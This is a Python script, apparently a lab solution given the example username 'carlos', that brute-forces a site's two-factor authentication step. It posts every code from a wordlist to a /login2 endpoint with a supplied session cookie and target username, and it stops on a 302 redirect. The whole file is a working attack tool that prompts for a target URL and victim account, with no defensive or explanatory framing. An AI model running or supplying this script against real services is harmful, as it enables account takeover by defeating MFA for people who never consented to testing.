import requests

# Load 2FA codes from a file
def load_2fa_codes(filepath):
    with open(filepath, 'r') as file:
        return [line.strip() for line in file]

# Perform the brute force attack on 2FA
def brute_force_2fa(url, verify_user, cookie, mfa_codes):
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': f'session={cookie}',  # Replace with your session cookie
    }
    
    for code in mfa_codes:
        data = {
            'verify': verify_user,   # Target username (e.g., 'carlos')
            'mfa-code': code         # The current MFA code being tested
        }
        
        # Send POST request to the server
        response = requests.post(url, data=data, headers=headers, allow_redirects=False)
        
        if response.status_code == 302:  # Successful login triggers 302 Redirect
            print(f"Success! Valid MFA code found: {code}")
            return code
        
        print(f"Attempted code {code}: Failed.")
    
    print("No valid MFA code found.")
    return None

# Input details
login2_url = input("Enter the POST /login2 URL (e.g., https://target.com/login2): ").strip()
verify_user = input("Enter the username to verify (e.g., carlos): ").strip()
session_cookie = input("Enter your session cookie value: ").strip()
mfa_codes_file = input("Enter the path to the 2FA codes file (e.g., ./2fa_codes.txt): ").strip()

# Load 2FA codes
mfa_codes = load_2fa_codes(mfa_codes_file)

# Start brute-forcing the 2FA codes
brute_force_2fa(login2_url, verify_user, session_cookie, mfa_codes)
